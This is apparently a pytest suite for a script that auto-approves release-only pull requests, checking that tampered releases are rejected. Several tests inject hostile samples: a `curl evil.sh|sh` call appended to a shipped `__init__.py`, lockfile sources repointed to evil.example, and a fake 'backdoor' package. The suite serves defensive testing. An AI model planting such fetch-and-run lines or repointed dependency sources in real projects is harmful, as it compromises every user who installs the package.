"""Tests for `scripts/changelog.py check-release-only`.

That command decides whether a pull request is approved without a human reading
it (`.github/workflows/release-auto-approve.yml`), so the cases that must NOT
pass matter more here than the one that must. Everything a release is allowed to
touch is a shipped artifact, and each of those has a test for what happens when
the diff puts something else inside it.
"""

from pathlib import Path
from textwrap import dedent

import pytest
from click.testing import CliRunner
from git import Actor, Repo

from scripts import apps
from scripts.changelog import changelog
from scripts.release_scope import out_of_release_scope

RELEASED_APP = Path("src/widget")

AUTHOR = Actor("Test", "test@example.com")


@pytest.mark.parametrize(
    "path",
    [
        "src/widget/CHANGELOG.md",
        "src/widget/changelog.d/20260101_fragment.md",
        "src/widget/pyproject.toml",
        "src/widget/mitol/widget/__init__.py",
        # The lockfile pins every workspace member's version, so it moves with
        # the bump. Allowed by path here, checked by content in the lockfile
        # tests below.
        "uv.lock",
    ],
)
def test_in_release_scope(path):
    """Paths a release legitimately touches are not reported"""
    assert out_of_release_scope([path], RELEASED_APP) == []


@pytest.mark.parametrize(
    "path",
    [
        # The three `changelog.py check` would let through: it only ever looks
        # under `src/<app>/`.
        ".github/workflows/ci.yml",
        "scripts/release.py",
        "pyproject.toml",
        # Another app's release, or its code, is somebody else's PR.
        "src/gadget/pyproject.toml",
        # `src/widget2` starts with `src/widget` as a string but is a different
        # app. Prefix matching would wave it through.
        "src/widget2/mitol/widget2/views.py",
    ],
)
def test_out_of_release_scope(path):
    """Everything else is reported, including the near-misses"""
    assert out_of_release_scope([path], RELEASED_APP) == [path]


def _write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(dedent(content).lstrip())


def _app(root: Path, name: str, version: str) -> None:
    """Lay down one workspace app at `version`"""
    _write(
        root / "src" / name / "pyproject.toml",
        f"""
        [project]
        name = "mitol-django-{name}"
        version = "{version}"
        dependencies = ["django>=4.2"]

        [tool.bumpver]
        current_version = "{version}"
        """,
    )
    _write(
        root / "src" / name / "mitol" / name / "__init__.py",
        f'"""The {name} app."""\n\n__version__ = "{version}"\n',
    )
    _write(root / "src" / name / "CHANGELOG.md", "# Changelog\n")


def _lockfile(**versions: str) -> str:
    """Build a lockfile shaped like uv's: a third-party pin and the members"""
    members = "\n\n".join(
        f'[[package]]\nname = "mitol-django-{name}"\nversion = "{version}"\n'
        f'source = {{ editable = "src/{name}" }}'
        for name, version in sorted(versions.items())
    )

    return (
        'version = 1\nrequires-python = ">=3.11"\n\n'
        '[[package]]\nname = "django"\nversion = "5.2"\n'
        'source = { registry = "https://pypi.org/simple" }\n\n'
        f"{members}\n"
    )


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    """Build a two-app git workspace at the commit a release branches from.

    `scripts.apps.get_source_dir` resolves against the real checkout's `src/`, so
    it is redirected here; `Project` reads the working directory, so the test runs
    from inside the fixture.
    """
    repo = Repo.init(tmp_path, initial_branch="main")

    _app(tmp_path, "widget", "1.0.0")
    _app(tmp_path, "gadget", "1.0.0")
    _write(
        tmp_path / "src" / "widget" / "changelog.d" / "20260101_change.md", "- A fix\n"
    )
    _write(tmp_path / "src" / "widget" / "notes.md", "Notes.\n")
    _write(tmp_path / "uv.lock", _lockfile(widget="1.0.0", gadget="1.0.0"))
    _write(tmp_path / ".github" / "workflows" / "ci.yml", "name: CI\n")

    repo.git.add(A=True)
    base = repo.index.commit("Base", author=AUTHOR, committer=AUTHOR)

    monkeypatch.setattr(apps, "get_source_dir", lambda: tmp_path / "src")
    monkeypatch.chdir(tmp_path)

    return repo, base


def _cut_release(tmp_path: Path, version: str = "1.1.0") -> None:
    """Do to `widget` what `scripts/release.py prepare` would"""
    _app(tmp_path, "widget", version)
    _write(
        tmp_path / "src" / "widget" / "CHANGELOG.md",
        f"# Changelog\n\n## {version}\n\n- A fix\n",
    )
    (tmp_path / "src" / "widget" / "changelog.d" / "20260101_change.md").unlink()
    _write(tmp_path / "uv.lock", _lockfile(widget=version, gadget="1.0.0"))


def _run(repo: Repo, base) -> object:
    repo.git.add(A=True)
    repo.index.commit("Release", author=AUTHOR, committer=AUTHOR)

    return CliRunner().invoke(
        changelog, ["check-release-only", "--base", base.hexsha, "--target", "HEAD"]
    )


def test_release_only_passes(workspace, tmp_path):
    """A release and nothing else is approved"""
    repo, base = workspace
    _cut_release(tmp_path)

    result = _run(repo, base)

    assert result.exit_code == 0, result.output
    assert "mitol-django-widget 1.1.0" in result.output


def test_diff_is_taken_from_the_merge_base(workspace, tmp_path):
    """Commits landed on the base since the branch point are not the PR's diff.

    A two-dot `base..HEAD` diff would show them reversed, read them as files
    outside the released app, and refuse to approve a clean release.
    """
    repo, base = workspace
    _write(tmp_path / "unrelated.md", "Landed on main after the branch point.\n")
    repo.git.add(A=True)
    moved_on = repo.index.commit("Other work", author=AUTHOR, committer=AUTHOR)

    repo.git.checkout(base.hexsha, b="release")
    _cut_release(tmp_path)
    repo.git.add(A=True)
    repo.index.commit("Release", author=AUTHOR, committer=AUTHOR)

    result = CliRunner().invoke(
        changelog,
        ["check-release-only", "--base", moved_on.hexsha, "--target", "HEAD"],
    )

    assert result.exit_code == 0, result.output


def test_release_plus_a_workflow_edit_is_rejected(workspace, tmp_path):
    """One extra file outside the app is enough to withhold the approval"""
    repo, base = workspace
    _cut_release(tmp_path)
    _write(tmp_path / ".github" / "workflows" / "ci.yml", "name: CI\n# sneak\n")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert ".github/workflows/ci.yml" in result.output


def test_a_file_renamed_out_of_the_app_is_rejected(workspace, tmp_path):
    """Both sides of a rename count, so moving a file out does not hide it"""
    repo, base = workspace
    _cut_release(tmp_path)
    repo.git.mv("src/widget/notes.md", "notes.md")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "notes.md is not part of releasing src/widget" in result.output


def test_release_plus_code_in_the_same_app_is_rejected(workspace, tmp_path):
    """The case `changelog.py check` already catches still has to fail here"""
    repo, base = workspace
    _cut_release(tmp_path)
    _write(tmp_path / "src" / "widget" / "mitol" / "widget" / "views.py", "x = 1\n")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "views.py is code, not a release" in result.output


def test_code_appended_to_the_shipped_init_is_rejected(workspace, tmp_path):
    """`__init__.py` is exempt by path in `check`; here its content is checked.

    It is imported by everyone who installs the package, and ci.yml publishes to
    PyPI off a version bump landing on main, so an approval here ships it.
    """
    repo, base = workspace
    _cut_release(tmp_path)
    init = tmp_path / "src" / "widget" / "mitol" / "widget" / "__init__.py"
    init.write_text(init.read_text() + '\nimport os\n\nos.system("curl evil.sh|sh")\n')

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "other than its `__version__` line" in result.output


def test_a_dependency_added_to_the_app_pyproject_is_rejected(workspace, tmp_path):
    """The other path-exempt file: only the two version declarations may move"""
    repo, base = workspace
    _cut_release(tmp_path)
    pyproject = tmp_path / "src" / "widget" / "pyproject.toml"
    pyproject.write_text(
        pyproject.read_text().replace(
            'dependencies = ["django>=4.2"]',
            'dependencies = ["django>=4.2", "totally-not-malware"]',
        )
    )

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "other than the version declarations" in result.output


def test_a_repointed_lockfile_source_is_rejected(workspace, tmp_path):
    """CI installs from uv.lock while holding the PyPI publishing identity"""
    repo, base = workspace
    _cut_release(tmp_path)
    lock = tmp_path / "uv.lock"
    lock.write_text(
        lock.read_text().replace("https://pypi.org/simple", "https://evil.example")
    )

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "rewrites locked packages other than the version" in result.output


def test_a_package_added_to_the_lockfile_is_rejected(workspace, tmp_path):
    """A release records a version; it does not lock anything new"""
    repo, base = workspace
    _cut_release(tmp_path)
    lock = tmp_path / "uv.lock"
    lock.write_text(
        lock.read_text() + '\n[[package]]\nname = "backdoor"\nversion = "1.0"\n'
        'source = { registry = "https://evil.example" }\n'
    )

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "adds or drops locked packages" in result.output


def test_a_shadowed_duplicate_lockfile_entry_is_rejected(workspace, tmp_path):
    """Two entries sharing a key would hide one behind the other.

    Keying packages by name and version means the second write wins, so only the
    survivor would ever be compared against the base. A hostile `source` placed
    in the losing entry would never be looked at.
    """
    repo, base = workspace
    _cut_release(tmp_path)
    lock = tmp_path / "uv.lock"
    lock.write_text(
        lock.read_text().replace(
            '[[package]]\nname = "django"\nversion = "5.2"\n'
            'source = { registry = "https://pypi.org/simple" }',
            '[[package]]\nname = "django"\nversion = "5.2"\n'
            'source = { url = "https://evil.example/django.whl" }\n\n'
            '[[package]]\nname = "django"\nversion = "5.2"\n'
            'source = { registry = "https://pypi.org/simple" }',
        )
    )

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "locks the same package more than once" in result.output


def test_a_duplicated_released_package_is_rejected(workspace, tmp_path):
    """The released distribution is keyed on name alone, so it collides too"""
    repo, base = workspace
    _cut_release(tmp_path)
    lock = tmp_path / "uv.lock"
    lock.write_text(
        lock.read_text()
        + '\n[[package]]\nname = "mitol-django-widget"\nversion = "9.9.9"\n'
        'source = { url = "https://evil.example/widget.whl" }\n'
    )

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "locks the same package more than once" in result.output


def test_changelog_rewrite_without_a_version_bump_is_rejected(workspace, tmp_path):
    """Rewriting CHANGELOG.md is not a release unless the version moves"""
    repo, base = workspace
    _cut_release(tmp_path, version="1.0.0")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "still 1.0.0" in result.output


def test_a_version_downgrade_is_rejected(workspace, tmp_path):
    """Require the version to go up, not merely to change"""
    repo, base = workspace
    _cut_release(tmp_path, version="0.9.0")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "not up" in result.output


def test_two_releases_at_once_are_rejected(workspace, tmp_path):
    """Releasing two apps in one PR is a human's call"""
    repo, base = workspace
    _cut_release(tmp_path)
    _app(tmp_path, "gadget", "2.0.0")
    _write(tmp_path / "src" / "gadget" / "CHANGELOG.md", "# Changelog\n\n## 2.0.0\n")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "More than one app is being released at once" in result.output


def test_a_plain_code_pr_is_not_a_release(workspace, tmp_path):
    """An ordinary PR exits non-zero without claiming anything is wrong with it"""
    repo, base = workspace
    _write(tmp_path / "src" / "widget" / "mitol" / "widget" / "views.py", "x = 1\n")

    result = _run(repo, base)

    assert result.exit_code == 1
    assert "not a release" in result.output
